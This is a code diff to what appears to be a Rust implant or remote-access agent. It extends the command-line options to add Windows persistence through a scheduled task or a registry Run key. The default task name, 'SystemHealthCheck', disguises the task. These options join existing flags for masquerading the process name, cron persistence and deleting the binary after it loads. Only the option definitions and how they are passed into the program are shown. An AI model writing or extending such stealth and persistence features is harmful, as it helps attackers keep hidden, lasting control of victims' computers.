@@ -42,11 +42,19 @@ struct Cli {
     #[arg(long)]
     masquerade: Option<String>,
 
-    /// Install cron @reboot entry for persistence
+    /// Install persistence (cron on Linux, schtasks on Windows)
     #[arg(long)]
     cron: bool,
 
-    /// Delete the binary after loading into memory (Linux only)
+    /// Windows: scheduled task name (default: SystemHealthCheck)
+    #[arg(long, default_value = "SystemHealthCheck")]
+    task_name: String,
+
+    /// Windows: use registry Run key instead of schtasks
+    #[arg(long)]
+    registry: bool,
+
+    /// Delete the binary after loading into memory
     #[arg(long)]
     self_delete: bool,
 
@@ -94,6 +102,8 @@ async fn main() {
             install_path: cli.install.clone(),
             process_name: cli.masquerade.clone(),
             cron: cli.cron,
+            task_name: cli.task_name.clone(),
+            registry: cli.registry,
         },
         &callback_args,
     );
